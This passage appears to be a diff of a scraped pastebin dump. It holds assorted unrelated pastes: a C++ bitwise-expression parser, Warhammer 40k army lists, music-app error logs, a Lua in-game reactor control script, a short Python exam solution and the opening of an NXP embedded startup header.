+				if (c == '0' || c == '1') {
+					idxn++;
+					n += c;
+				}
+				else
+					condition = -1;
+			}
+			else {
+				if (c == '0' || c == '1')
+					condition = -1;
+				else {
+					op = defop(c);
+					if (op == -1)
+						condition = -1;
+					else if (op == 5) {
+						var t;
+						t.n = n;
+						t.name = name;
+						name = """";
+						idxname = 0;
+						ch(vars, t);
+						condition = 0;
+					}
+					else
+						condition = 4;
+				}
+			}
+			break;
+		case 4:
+			if (isalpha(c)) {
+				condition = 5;
+				name1 = c;
+			}
+			else if (c == '0' || c == '1') {
+				condition = 6;
+				idxn1 = 1;
+				n1 = c;
+			}
+			else
+				condition = -1;
+			break;
+		case 5:
+			if (isalpha(c) || isdigit(c)) {
+				name1 += c;
+			}
+			else if (c == ' ' || c == ';') {
+				n1 = find(name1, vars);
+				if (n1 == ""-"")
+					condition = -1;
+				else {
+					string ans = ""00000000"";
+					for (int i = 0; i < 8; ++i) {
+						int a = (n[i] - '0'), b = (n1[i] - '0');
+						switch (op) {
+						case 0:
+							ans[i] = (a || b) + '0';
+							break;
+						case 1:
+							ans[i] = (a && b) + '0';
+							break;
+						case 2:
+							ans[i] = ((a + b) % 2) + '0';
+							break;
+						case 3:
+							ans[i] = (!(a && !b)) + '0';
+							break;
+						case 4:
+							ans[i] = (!(a && b)) + '0';
+							break;
+						}
+					}
+					var gh;
+					gh.n = ans;
+					gh.name = name;
+					name = """";
+					idxname = 0;
+					ch(vars, gh);
+					condition = 0;
+				}
+			}
+			else
+				condition = -1;
+			break;
+		case 6:
+			if (idxn1 < 8) {
+				if (c == '0' || c == '1') {
+					idxn1++;
+					n1 += c;
+				}
+				else
+					condition = -1;
+			}
+			else {
+				if (c == '0' || c == '1')
+					condition = -1;
+				else {
+					string ans = ""00000000"";
+					for (int i = 0; i < 8; ++i) {
+						int a = (n[i] - '0'), b = (n1[i] - '0');
+						switch (op) {
+						case 0:
+							ans[i] = (a || b) + '0';
+							break;
+						case 1:
+							ans[i] = (a && b) + '0';
+							break;
+						case 2:
+							ans[i] = ((a + b) % 2) + '0';
+							break;
+						case 3:
+							ans[i] = (!(a && !b)) + '0';
+							break;
+						case 4:
+							ans[i] = (!(a && b)) + '0';
+							break;
+						}
+					}
+					var gh;
+					gh.n = ans;
+					gh.name = name;
+					name = """";
+					idxname = 0;
+					ch(vars, gh);
+					condition = 0;
+				}
+			}
+		}
+		if (condition == -1)
+			return false;
+	}
+	return true;
+}
+void pr(node* head) {
+	while (head) {
+		cout << head->info.name << '=' << head->info.n << '\n';
+		head = head->next;
+	}
+}
+int main()
+{
+	node* vars = NULL;
+	if (f(vars)) {
+		pr(vars);
+	}
+	else {
+		cout << ""syntax error"";
+	}
+}
+"
+3civ0FaT,Ottawa Teams R5 Knights,TableTopLive,PHP,Sunday 8th of June 2025 12:51:54 PM CDT,"Player Name: Antoine Boivin
+Factions Used: Imperial Knights / Imperial Agents
+Army Points: 2000
+Army Enhancements: none
+Detachment Rule: noble lance ( indomitable heroes)
+++++++++++++++++++++++++++++++++++
+
+Finally, a Knight list that is different (2000 points)
+
+Imperial Knights
+Strike Force (2000 points)
+Noble Lance
+
+
+CHARACTERS
+
+Canis Rex (450 points)
+• Warlord
+• 1x Chainbreaker las-impulsor
+1x Chainbreaker multi-laser
+1x Freedom’s Hand
+
+
+BATTLELINE
+
+Armiger Helverin (130 points)
+• 2x Armiger autocannon
+1x Armoured feet
+1x Questoris heavy stubber
+
+Armiger Helverin (130 points)
+• 2x Armiger autocannon
+1x Armoured feet
+1x Questoris heavy stubber
+
+Armiger Helverin (130 points)
+• 2x Armiger autocannon
+1x Armoured feet
+1x Questoris heavy stubber
+
+Armiger Helverin (130 points)
+• 2x Armiger autocannon
+1x Armoured feet
+1x Questoris heavy stubber
+
+Armiger Warglaive (140 points)
+• 1x Meltagun
+1x Reaper chain-cleaver
+1x Thermal spear
+
+Armiger Warglaive (140 points)
+• 1x Meltagun
+1x Reaper chain-cleaver
+1x Thermal spear
+
+Armiger Warglaive (140 points)
+• 1x Meltagun
+1x Reaper chain-cleaver
+1x Thermal spear
+
+Armiger Warglaive (140 points)
+• 1x Meltagun
+1x Reaper chain-cleaver
+1x Thermal spear
+
+Armiger Warglaive (140 points)
+• 1x Meltagun
+1x Reaper chain-cleaver
+1x Thermal spear
+
+
+ALLIED UNITS
+
+Callidus Assassin (100 points)
+• 1x Neural shredder
+1x Phase sword and poison blades
+
+Sisters of Battle Immolator (115 points)
+• 1x Armoured tracks
+1x Heavy bolter
+1x Hunter-killer missile
+1x Immolation flamers
+
+Sisters of Battle Squad (115 points)
+• 1x Sister Superior
+• 1x Bolt pistol
+1x Close combat weapon
+1x Condemnor boltgun
+1x Power weapon
+• 9x Battle Sister
+• 9x Bolt pistol
+7x Boltgun
+9x Close combat weapon
+1x Meltagun
+1x Multi-melta
+1x Simulacrum Imperialis"
+tddByu9d,Ottawa Teams R5 Necrons,TableTopLive,PHP,Sunday 8th of June 2025 12:51:37 PM CDT,"Player Name: Devin Swann
+Team Name: Blunt Force Trauma
+Factions Used: Necrons
+Army Points: 1995
+Army Enhancements (list on which models): Dread Majesty (on Char1: Catacomb Command Barge) & Demanding Leader (on Char2: Technomancer)
+Detachment Rule: Relentless Onslaught
++++++++++++++++++++++++++++++++++++++++++++++++
+
+Char1: 1x Imotekh the Stormlord (100 pts): Gauntlet of Fire, Staff of the Destroyer
+Char2: 1x Catacomb Command Barge (150 pts): Resurrection orb, Warlord, Gauss cannon, Overlord's blade
+Enhancement: Dread Majesty (+30 pts)
+Char3: 1x Technomancer (95 pts): Staff of light
+Enhancement: Demanding Leader (+10 pts)
+Char4: 1x Technomancer (85 pts): Staff of light
+Char5: 1x Technomancer (85 pts): Staff of light
+
+3x Ophydian Destroyers (80 pts): Plasmacyte, 3 with Ophydian hyperphase weapons
+1x Lokhust Destroyers (35 pts): Close combat weapon, Gauss cannon
+6x Canoptek Wraiths (230 pts): 6 with Particle caster, Vicious claws
+6x Canoptek Wraiths (230 pts): 6 with Particle caster, Vicious claws
+6x Canoptek Wraiths (230 pts): 6 with Particle caster, Vicious claws
+1x Canoptek Reanimator (75 pts): 2x Atomiser beam, Reanimator's claws
+1x Doomsday Ark (200 pts): Armoured bulk, Doomsday cannon, 2x Gauss flayer array
+1x Doomsday Ark (200 pts): Armoured bulk, Doomsday cannon, 2x Gauss flayer array
+1x Doomsday Ark (200 pts): Armoured bulk, Doomsday cannon, 2x Gauss flayer array"
+JpPT0hib,2025-06-08T19:37:55.502859,powerampache,PHP,Sunday 8th of June 2025 12:38:03 PM CDT,"1.00-70 (70) - DB: 83
+retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""music.acidarea.net"": No address associated with hostname"" }
+	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
+	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
+	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
+	at java.lang.Thread.run(Thread.java:1012)
+
+getSongs() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""stackTrace"":[]}"
+9kF0Qxt0,2025-06-08T19:37:53.530252,powerampache,PHP,Sunday 8th of June 2025 12:38:03 PM CDT,"1.00-70 (70) - DB: 83
+retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""music.acidarea.net"": No address associated with hostname"" }
+	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
+	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
+	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
+	at java.lang.Thread.run(Thread.java:1012)
+
+getAlbumsStats() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""stackTrace"":[]}"
+DRSUCzZf,2025-06-08T19:37:55.486850,powerampache,PHP,Sunday 8th of June 2025 12:38:01 PM CDT,"1.00-70 (70) - DB: 83
+retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""music.acidarea.net"": No address associated with hostname"" }
+	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
+	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
+	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
+	at java.lang.Thread.run(Thread.java:1012)
+
+getArtists() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Unable to resolve host \""music.acidarea.net\"": No address associated with hostname\"" }"",""stackTrace"":[]}"
+GXqUC2nR,reactor,lemarwin,Lua,Sunday 8th of June 2025 12:06:12 PM CDT,"if warpdriveCommons then os.unloadAPI(""warpdriveCommons"") end
+if not os.loadAPI(""warpdrive/warpdriveCommons"") then error(""missing warpdriveCommons"") end
+local w = warpdriveCommons.w
+
+local data
+
+----------- Reactor support
+
+--  0000000001111111111222222222233333333334444444444
+--  1234567890123456789012345678901234567890123456789
+-- [Reactor stability %      Laser level k           ]
+-- [ 99.9 99.9 99.9 99.9     56 123456 123456 123456 ]
+-- [ 99.9 99.9 99.9 99.9     123.4 123.4 123.4 123.4 ]
+-- [ 99.9 99.9 99.9 99.9     4.5 x 456 123456 123456 ]
+-- [ 99.9 99.9 99.9 99.9 123456 123456 123456 123456 ]
+
+local reactor
+local reactorlasers = {}
+
+local reactor_outputMode = ""off""
+local reactor_outputThreshold = 100
+local reactor_targetStability = 50
+local reactor_laserAmount = 10000
+
+local reactor_output = 0
+local tArgs= { ... } 
+
+local signal_side = tArgs[1] or ""right""
+local min_stability_str = tArgs[2] or ""5.0""
+local min_stability = tonumber(min_stability_str)
+
+function reactor_read(parData)
+  data = parData
+end
+
+function reactor_boot()
+  if reactor ~= nil then
+    w.writeLn(""Booting Reactor..."")
+    reactor_outputMode, reactor_outputThreshold = reactor.outputMode()
+    reactor_targetStability = 100.0 - reactor.instabilityTarget()
+    reactor_laserAmount = reactor.stabilizerEnergy()
+  end
+end
+
+function reactor_cycleOutputMode()
+  if reactor_outputMode == ""off"" then
+    reactor_outputMode = ""above""
+  elseif reactor_outputMode == ""above"" then
+    reactor_outputMode = ""at_rate""
+  else
+    reactor_outputMode = ""off""
+  end
+end
+
+local stage = ""off""
+local preoutput_cycles = 0
+
+function run_stage()
+    if stage == ""off"" then
+        reactor_stop()
+    elseif stage == ""warmup"" then
+        reactor_outputMode = ""off""
+        reactor_targetStability = 7
+        reactor_setTargetStability()
+        reactor_start()
+    elseif stage == ""preoutput"" then
+        preoutput_cycles = 0
+        reactor_outputThreshold = 75000
+        reactor_outputMode = ""above""
+        reactor_setMode()
+    elseif stage == ""output"" then
+        reactor_outputThreshold = 7500
+        reactor_outputMode = ""above""
+        reactor_setMode()
+    end
+end
+
+function reactor_key(character, keycode)
+  if character == 's' or character == 'S' then -- S
+    reactor_start()
+    return true
+  elseif character == 'p' or character == 'P' then -- P
+    reactor_stop()
+    return true
+  elseif character == 'l' or character == 'L' then -- L
+    reactor_laser()
+    return true
+  elseif character == 'o' or character == 'O' then -- O
+    reactor_cycleOutputMode()
+    reactor_setMode()
+    return true
+  elseif character == 'g' or character == 'G' then -- G
+    reactor_outputThreshold = reactor_outputThreshold - 1000
+    reactor_setMode()
+    return true
+  elseif character == 't' or character == 'T' then -- T
+    reactor_outputThreshold = reactor_outputThreshold + 1000
+    reactor_setMode()
+    return true
+  elseif character == 'j' or character == 'J' then -- J
+    reactor_laserAmount = reactor_laserAmount - 500
+    reactor_setLaser()
+    return true
+  elseif character == 'u' or character == 'U' then -- U
+    reactor_laserAmount = reactor_laserAmount + 500
+    reactor_setLaser()
+    return true
+  elseif character == '-' then -- -
+    reactor_targetStability = reactor_targetStability - 1
+    reactor_setTargetStability()
+    return true
+  elseif character == '+' then -- +
+    reactor_targetStability = reactor_targetStability + 1
+    reactor_setTargetStability()
+    return true
+  elseif character == 'c' or character == 'C' then -- C
+    reactor_config()
+    return true
+  elseif character == 'a' or character == 'C' then 
+    if stage == ""off"" then
+        stage = ""warmup""
+        run_stage()
+        return true
+    else 
+        stage = ""off""
+        run_stage()
+        return true
+    end
+  end
+  return false
+end
+
+function reactor_page()
+  w.page_begin(w.data_getName() .. "" - Reactor status"")
+  
+  w.setCursorPos(1, 2)
+  if reactor == nil or reactor.isInterfaced() == nil then
+    w.setColorDisabled()
+    w.write(""Reactor not detected"")
+  else
+    w.setColorNormal()
+    w.write(""Reactor stability (%)"")
+    local instabilities = { reactor.getInstabilities() }
+    for key, instability in pairs(instabilities) do
+      local y = (key - 1) % 4
+      local x = (key - 1 - y) / 4
+      w.setCursorPos(2 + 6 * x, 3 + y)
+      local stability = math.floor((100.0 - instability) * 10) / 10.0
+      if stability >= reactor_targetStability then
+        w.setColorSuccess()
+      else
+        w.setColorWarning()
+      end
+      w.write(w.format_float(stability, 5))
+    end
+    
+    w.setColorNormal()
+    local energyStored, energyMax, energyUnits, _, energyOutputRate = reactor.getEnergyStatus()
+    w.setCursorPos(1, 7)
+    w.write(""Energy   : "")
+    w.write(w.format_integer(energyStored, 10) .. "" / "" .. w.format_integer(energyMax, 10) .. "" "" .. energyUnits .. "" +"" .. w.format_integer(reactor_output, 6) .. "" "" .. energyUnits .. ""/t"")
+    w.setCursorPos(1, 8)
+    w.write(""Outputing: "")
+    w.write(w.format_integer(energyOutputRate, 6) .. "" "" .. energyUnits .. ""/t"")
+    
+    w.setCursorPos(1, 9)
+    w.setColorNormal()
+    w.write(""Activated: "")
+    local isEnabled = reactor.enable()
+    if isEnabled then w.setColorSuccess() else w.setColorNormal() end
+    w.write(w.format_boolean(isEnabled, ""YES"", ""no""))
+    w.setColorNormal()
+    w.write(""; Auto stage: "")
+    w.write(stage)
+  end
+  
+  w.setCursorPos(28, 2)
+  if #reactorlasers == 0 then
+    w.setColorDisabled()
+    w.write(""Lasers not detected"")
+  else
+    w.setColorNormal()
+    w.write(""Lasers charge (k)"")
+    
+    for _, reactorlaser in pairs(reactorlasers) do
+      if reactorlaser.wrap ~= nil and reactorlaser.side ~= nil then
+        local y = reactorlaser.side % 4
+        local x = (reactorlaser.side - y) / 4
+        w.setCursorPos(28 + 6 * x, 3 + y)
+        local energyStored, _, _ = reactorlaser.wrap.getEnergyStatus()
+        if energyStored == nil then
+          energyStored = -1
+        end
+        local energy_k = math.floor(energyStored / 100) / 10.0
+        if not reactorlaser.wrap.getAssemblyStatus() then
+          w.setColorDisabled()
+        elseif energyStored > 3 * reactor_laserAmount then
+          w.setColorSuccess()
+        else
+          w.setColorWarning()
+        end
+        w.write(w.format_integer(energy_k, 5))
+      end
+    end
+  end
+  
+  w.setCursorPos(1, 10)
+  w.setColorNormal()
+  w.write(""  -----------------------------------------------"")
+  w.setCursorPos(1, 11)
+  w.write(""Output mode     : "")
+  if reactor_outputMode == ""off"" then
+    w.setColorDisabled()
+    w.write(""hold"")
+  elseif reactor_outputMode == ""unlimited"" then
+    w.write(""manual/unlimited"")
+  elseif reactor_outputMode == ""above"" then
+    w.write(""surplus above "" .. reactor_outputThreshold .. "" RF"")
+  else
+    w.write(""rated at "" .. reactor_outputThreshold .. "" RF"")
+  end
+  w.setCursorPos( 1, 12)
+  w.setColorNormal()
+  w.write(""Target stability: "" .. reactor_targetStability .. ""%"")
+  w.setCursorPos(30, 12)
+  w.write(""Laser amount: "" .. w.format_integer(reactor_laserAmount))
+  
+  w.setCursorPos(1, 14)
+  w.setColorControl()
+  w.writeFullLine("" Start/stoP reactor (S/P), Use lasers (L)"")
+  w.writeFullLine("" Output mode (O), Configuration (C)"")
+  w.writeFullLine("" Target stability (+/-), Laser amount (U/J)"")
+  w.writeFullLine("" Output rate/threshold (T/G)"")
+end
+
+function reactor_setMode()
+  if reactor_outputThreshold < 1 then
+    reactor_outputThreshold = 1
+  elseif reactor_outputThreshold > 100000 then
+    reactor_outputThreshold = 100000
+  end
+  if reactor ~= nil then
+      reactor.outputMode(reactor_outputMode, reactor_outputThreshold)
+  end
+end
+
+function reactor_setLaser()
+  if reactor_laserAmount < 1 then
+    reactor_laserAmount = 1
+  elseif reactor_laserAmount > 100000 then
+    reactor_laserAmount = 100000
+  end
+  if reactor ~= nil then
+    reactor_laserAmount = reactor.stabilizerEnergy(reactor_laserAmount)
+  end
+end
+
+function reactor_setTargetStability()
+  if reactor_targetStability < 1.0 then
+    reactor_targetStability = 1.0
+  elseif reactor_targetStability > 100.0 then
+    reactor_targetStability = 100.0
+  end
+  if reactor ~= nil then
+    reactor_targetStability = 100.0 - reactor.instabilityTarget(100.0 - reactor_targetStability)
+  end
+end
+
+function reactor_start()
+  if reactor ~= nil then
+    reactor_setMode()
+    reactor.enable(true)
+  end
+end
+
+function reactor_stop()
+  if reactor ~= nil then
+    reactor.enable(false)
+  end
+end
+
+function reactor_laser(side)
+  for key, reactorlaser in pairs(reactorlasers) do
+    if (side == nil) or (reactorlaser.side == side) then
+      reactorlaser.wrap.stabilize(reactor_laserAmount)
+    end
+  end
+end
+
+local reactor_configPageLoaded = false
+function reactor_pulse(output)
+  reactor_output = output
+  if reactor == nil or reactor.isInterfaced() == nil then
+    w.reboot()
+  end
+  local instabilities = { reactor.getInstabilities() }
+  for key, instability in pairs(instabilities) do
+    local stability = math.floor((100.0 - instability) * 10) / 10
+    if stability <= min_stability then 
+        redstone.setOutput(""right"", true)
+    end
+  end
+  local energyStored, energyMax, energyUnits, _, energyOutputRate = reactor.getEnergyStatus()
+  if stage == ""warmup"" and (energyStored == energyMax) then 
+    stage = ""preoutput""
+    run_stage()
+  elseif stage == ""preoutput"" then 
+    if preoutput_cycles == 10 then 
+        stage = ""output""
+        run_stage()
+    else 
+        preoutput_cycles = preoutput_cycles + 1
+    end
+  end
+  if w.page_getCallbackDisplay() == reactor_page and (not reactor_configPageLoaded) then
+    for key, instability in pairs(instabilities) do
+      local y = (key - 1) % 4
+      local x = (key - 1 - y) / 4
+      w.setCursorPos(2 + 6 * x, 3 + y)
+      local stability = math.floor((100.0 - instability) * 10) / 10
+      if stability >= reactor_targetStability then
+        w.setColorSuccess()
+      else
+        w.setColorWarning()
+      end
+      w.write(w.format_float(stability, 5))
+    end
+    w.setCursorPos(12, 7)
+    w.setColorNormal()
+    w.write(w.format_integer(energyStored, 10))
+    w.setCursorPos(40, 7)
+    w.write(w.format_integer(reactor_output, 6))
+    w.setCursorPos(12, 8)
+    w.write(w.format_integer(energyOutputRate, 6))
+    
+    if #reactorlasers ~= 0 then
+      for _, reactorlaser in pairs(reactorlasers) do
+        if reactorlaser.wrap ~= nil and reactorlaser.side ~= nil then
+          local y = reactorlaser.side % 4
+          local x = (reactorlaser.side - y) / 4
+          w.setCursorPos(28 + 6 * x, 3 + y)
+          local energyStored, _, _ = reactorlaser.wrap.getEnergyStatus()
+          if energyStored == nil then
+            energyStored = -1
+          end
+          local energy_k = math.floor(energyStored / 100) / 10.0
+          if not reactorlaser.wrap.getAssemblyStatus() then
+            w.setColorDisabled()
+          elseif energyStored > 3 * reactor_laserAmount then
+            w.setColorSuccess()
+          else
+            w.setColorWarning()
+          end
+          w.write(w.format_integer(energy_k, 5))
+        end
+      end
+    end
+  end
+end
+
+function reactor_config()
+  reactor_configPageLoaded = true
+  w.page_begin(w.data_getName() .. "" - Reactor configuration"")
+  
+  w.setCursorPos(1, 2)
+  if reactor == nil or reactor.isInterfaced() == nil then
+    w.setColorDisabled()
+    w.write(""Reactor not detected"")
+  else
+    -- reactor output rate
+    w.setCursorPos(1, 6)
+    w.setColorHelp()
+    w.writeFullLine("" Enter a positive number."")
+    
+    w.setCursorPos(1, 4)
+    w.setColorNormal()
+    w.write(""Reactor output rate ("" .. w.format_integer(reactor_outputThreshold) .. "" RF): "")
+    reactor_outputThreshold = w.input_readInteger(reactor_outputThreshold)
+    reactor_setMode()
+    w.setCursorPos(1, 5)
+    w.write(""Reactor output rate set"")
+    w.setCursorPos(1, 6)
+    w.writeFullLine("" "")
+    
+    -- laser amount
+    w.setCursorPos(1, 9)
+    w.setColorHelp()
+    w.writeFullLine("" Enter a positive number."")
+    
+    w.setCursorPos(1, 7)
+    w.setColorNormal()
+    w.write(""Laser energy level ("" .. w.format_integer(reactor_laserAmount) .. ""): "")
+    reactor_laserAmount = w.input_readInteger(reactor_laserAmount)
+    reactor_setLaser()
+    w.setCursorPos(1, 8)
+    w.write(""Laser energy level set"")
+    w.setCursorPos(1, 9)
+    w.writeFullLine("" "")
+    
+    -- target stability
+    w.setCursorPos(1, 12)
+    w.setColorHelp()
+    w.writeFullLine("" Enter a positive number."")
+    
+    w.setCursorPos(1, 10)
+    w.setColorNormal()
+    w.write(""Reactor target stability ("" .. w.format_integer(reactor_targetStability) .. ""%): "")
+    reactor_targetStability = w.input_readInteger(reactor_targetStability)
+    reactor_setTargetStability()
+    w.setCursorPos(1, 11)
+    w.write(""Reactor target stability set"")
+    w.setCursorPos(1, 12)
+    w.writeFullLine("" "")
+  end
+  reactor_configPageLoaded = false
+end
+
+function reactor_register()
+  w.device_register(""warpdriveEnanReactorCore"",
+      function(deviceType, address, wrap) reactor = wrap end,
+      function() end)
+  w.device_register(""warpdriveEnanReactorLaser"",
+      function(deviceType, address, wrap) table.insert(reactorlasers, { side = wrap.side(), wrap = wrap }) end,
+      function() end)
+  w.event_register(""reactorPulse""       , function(eventName, param) reactor_pulse(param)                        return false end )
+  w.event_register(""reactorDeactivation"", function(                ) w.status_showWarning(""Reactor deactivated"") return false end )
+  w.event_register(""reactorActivation""  , function(                ) w.status_showWarning(""Reactor activated"")   return false end )
+  w.data_register(""reactor"", reactor_read, nil, nil)
+end
+
+----------- connections status
+
+function connections_page(isBooting)
+  w.page_begin(w.data_getName() .. "" - Connections"")
+  
+  w.writeLn("""")
+  
+  local monitors = w.device_getMonitors()
+  if #monitors == 0 then
+    w.setColorDisabled()
+    w.writeLn(""No Monitor detected"")
+  elseif #monitors == 1 then
+    w.setColorSuccess()
+    w.writeLn(""1 monitor detected"")
+  else
+    w.setColorSuccess()
+    w.writeLn(#monitors .. "" Monitors detected"")
+  end
+  
+  if reactor == nil or reactor.isInterfaced() == nil then
+    w.setColorDisabled()
+    w.writeLn(""No Enantiomorphic reactor detected"")
+  else
+    w.setColorSuccess()
+    w.writeLn(""Enantiomorphic reactor detected"")
+    if isBooting then
+      reactor_boot()
+    end
+  end
+  
+  if #reactorlasers == 0 then
+    w.setColorDisabled()
+    w.writeLn(""No reactor stabilisation laser detected"")
+  elseif #reactorlasers == 1 then
+    w.setColorSuccess()
+    w.writeLn(""1 reactor stabilisation laser detected"")
+  else
+    w.setColorSuccess()
+    w.writeLn(#reactorlasers .. "" reactor stabilisation lasers detected"")
+  end
+  
+  w.writeLn("""")
+  w.setColorNormal()
+  w.writeLn(""This is a keyboard controlled user interface."")
+  w.write(""Key controls are written like so: "")
+  w.setColorControl()
+  w.write(""Action (key)"")
+  w.setColorNormal()
+  w.writeLn(""."")
+  w.write(""For example, typing "")
+  w.setColorControl()
+  w.write("" 1 "")
+  w.setColorNormal()
+  w.writeLn("" will open Reactor controls."")
+end
+
+----------- Boot sequence
+
+w.page_setEndText("" Home (0), Reactor controls (1)"")
+w.page_register('0', connections_page, nil)
+w.page_register('1', reactor_page, reactor_key)
+reactor_register()
+
+w.boot()
+local success, message = pcall(w.run)
+if not success then
+  print(""failed with message"")
+  print(message)
+  w.sleep(3.0)
+  print(""rebooting..."")
+  w.reboot()
+else
+  w.close()
+end
+"
+d8raPyFG,Key For All Games,lunox039,Lua,Sunday 8th of June 2025 12:04:25 PM CDT,subscribeMenyanety
+1821prLQ,24,nq1s788,Python,Sunday 8th of June 2025 12:00:55 PM CDT,"#24 https://kpolyakov.spb.ru/school/ege/gen.php?action=viewVar&select=7FFFFFF&answers=on&varId=91034
+s = open('24.txt').readline()
+alph = '1234567890ABCDEF'
+c = ''
+answ = 0
+for e in s:
+    if e not in alph:
+        if len(c) != 0:
+            if '0' in c:
+                lst0 = c.rindex('0')
+                c = c[:lst0 + 1]
+                while len(c) > 0 and c[0] == '0':
+                    c = c[1:]
+                answ = max(answ, len(c))
+            c = ''
+    else:
+        c += e
+print(answ)"
+HRYJx2tV,startup.h,Mike057,C,Sunday 8th of June 2025 11:29:27 AM CDT,"/*
+ * Copyright 2013 - 2014, Freescale Semiconductor, Inc.
+ * Copyright 2016-2021, 2023 NXP
+ *                                                                                                                                                                                                                                                     
+ * SPDX-License-Identifier: BSD-3-Clause
+ */
+
+#ifndef STARTUP_H
+#define STARTUP_H
+
+#include <stdint.h>
+#include ""device_registers.h""
+/**
+ * @page misra_violations MISRA-C:2012 violations
+ *
+ * @section [global]
+ * Violates MISRA 2012 Advisory Rule 2.5, Local macro not referenced.
+ * The defined macro is used as include guard.
+ *
+ * @section [global]
+ * Violates MISRA 2012 Advisory Rule 8.9, An object should be defined at block
+ * scope if its identifier only appears in a single function.
+ * All variables with this problem are defined in the linker files.
+ *
+ */
+
+/*******************************************************************************
+ * API
+ ******************************************************************************/
+
+/*!
+ * @brief define symbols that specific start and end addres of some basic sections.
+ */
+#if (defined(S32K14x_SERIES) || defined(S32K11x_SERIES) || defined(S32V234_SERIES) || \
+     defined(MPC574x_SERIES) || defined(S32R_SERIES) || defined(S32MTV_SERIES) || \
+     defined(SJA1110_SERIES)) || defined (S32K144W_M4_SERIES) || defined (S32K142W_M4_SERIES)
+    #if (defined(__ICCARM__))
+        #define INTERRUPTS_SECTION_START               __section_begin("".intvec"")
+        #define INTERRUPTS_SECTION_END                 __section_end("".intvec"")
+        #define BSS_SECTION_START                      __section_begin("".bss"")
+        #define BSS_SECTION_END                        __section_end("".bss"")
+        #define DATA_SECTION_START                     __section_begin("".data"")
+        #define DATA_SECTION_END                       __section_end("".data"")
+        #define CUSTOMSECTION_SECTION_START            __section_begin("".customSection"")
+        #define CUSTOMSECTION_SECTION_END              __section_end("".customSection"")
+        #define CODE_RAM_SECTION_START                 __section_begin(""__CODE_RAM"")
+        #define CODE_RAM_SECTION_END                   __section_end(""__CODE_RAM"")
+        #define DATA_INIT_SECTION_START                __section_begin("".data_init"")
+        #define DATA_INIT_SECTION_END                  __section_end("".data_init"")
+        #define CODE_ROM_SECTION_START                 __section_begin(""__CODE_ROM"")
+        #define CODE_ROM_SECTION_END                   __section_end(""__CODE_ROM"")
+
+    #elif (defined(__ARMCC_VERSION))
+        #define INTERRUPTS_SECTION_START               (uint8_t *)__VECTOR_ROM_START
+        #define INTERRUPTS_SECTION_END                 (uint8_t *)__VECTOR_ROM_END
+        #define BSS_SECTION_START                      (uint8_t *)__BSS_START
+        #define BSS_SECTION_END                        (uint8_t *)__BSS_END
+        #define DATA_SECTION_START                     (uint8_t *)__DATA_RAM_START
+        #define DATA_SECTION_END                       (uint8_t *)__DATA_RAM_END
+        #define CUSTOMSECTION_SECTION_START            (uint8_t *)__CUSTOM_SECTION_START
+        #define CUSTOMSECTION_SECTION_END              (uint8_t *)__CUSTOM_SECTION_END
+        #define CODE_RAM_SECTION_START                 (uint8_t *)__CODE_RAM_START
+        #define CODE_RAM_SECTION_END                   (uint8_t *)__CODE_RAM_END
+
+        extern uint32_t __VECTOR_ROM_START;
+        extern uint32_t __VECTOR_ROM_END;
+        extern uint32_t __BSS_START;
+        extern uint32_t __BSS_END;
+        extern uint32_t __DATA_RAM_START;
+        extern uint32_t __DATA_RAM_END;
+        extern uint32_t __CUSTOM_SECTION_START;
+        extern uint32_t __CUSTOM_SECTION_END;
+        extern uint32_t __CODE_RAM_START;
+        extern uint32_t __CODE_RAM_END;
+    #else
+        #define INTERRUPTS_SECTION_START               (uint8_t *)&__interrupts_start__
+        #define INTERRUPTS_SECTION_END                 (uint8_t *)&__interrupts_end__
+        #define BSS_SECTION_START                      (uint8_t *)&__bss_start__
+        #define BSS_SECTION_END                        (uint8_t *)&__bss_end__
+        #define DATA_SECTION_START                     (uint8_t *)&__data_start__
+        #define DATA_SECTION_END                       (uint8_t *)&__data_end__
+        #define CUSTOMSECTION_SECTION_START            (uint8_t *)&__customSection_start__
+        #define CUSTOMSECTION_SECTION_END              (uint8_t *)&__customSection_end__
+        #define CODE_RAM_SECTION_START                 (uint8_t *)&__code_ram_start__
+        #define CODE_RAM_SECTION_END                   (uint8_t *)&__code_ram_end__
+
+        extern uint32_t __interrupts_start__;
+        extern uint32_t __interrupts_end__;
+        extern uint32_t __bss_start__;
+        extern uint32_t __bss_end__;
+        extern uint32_t __data_start__;
+        extern uint32_t __data_end__;
+        extern uint32_t __customSection_start__;
+        extern uint32_t __customSection_end__;
+        extern uint32_t __code_ram_start__;
+        extern uint32_t __code_ram_end__;
+    #endif
+#endif
+
+#if (defined(__ICCARM__))
+    #pragma section = "".data""
